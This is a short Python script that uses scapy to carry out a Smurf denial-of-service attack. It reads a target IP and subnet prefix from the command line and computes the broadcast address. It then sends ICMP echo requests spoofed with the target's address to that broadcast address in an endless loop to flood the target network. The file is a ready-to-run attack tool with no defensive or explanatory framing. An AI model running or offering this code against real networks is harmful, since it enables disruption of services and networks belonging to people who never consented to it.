from scapy.all import IP, ICMP, send
from netaddr import IPNetwork
import argparse
import sys

g_target_ip = ""
g_broadcast_ip = ""


"""
	This function computes the broadcast address using the subnet mask
"""
def compute_broadcast_addr(subnet_mask):
	global g_broadcast_ip
	ip = IPNetwork(g_target_ip+"/"+subnet_mask)
	g_broadcast_ip = ip.broadcast


"""
	This function creates an ICMP Echo request and keeps sending it on the
	target's broadcast address
"""
def start_smurf():
	global g_broadcast_ip
	pkt = IP(src = g_target_ip, dst = g_broadcast_ip)/ICMP()

	# Send the packet continuously to overwhelm the target network
	print("[*] Starting SMURF attack")
	try:
		while True:
			send(pkt, verbose = False)

	except KeyboardInterrupt:
		sys.exit("User Exited")


def main():
	global g_target_ip, g_broadcast_ip

	# Get the args
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", help="Specify the target's IP")
	parser.add_argument("-s", help="Specify the subnet mask (CIDR prefix)")
	args = parser.parse_args()

	g_target_ip = args.t
	subnet_mask = args.s

	if (g_target_ip == None):
		sys.exit("[#] Please specify the target's IP address.\n[#] Exiting")
	if (subnet_mask == None):
		sys.exit("[#] Please specify the subnet mask of the target network.\n[#] Exiting")

	compute_broadcast_addr(subnet_mask)

	print("[*] Target IP: ", g_target_ip)
	print("[*] Target Broadcast IP: ", g_broadcast_ip)

	start_smurf()

if __name__ == "__main__":
	main()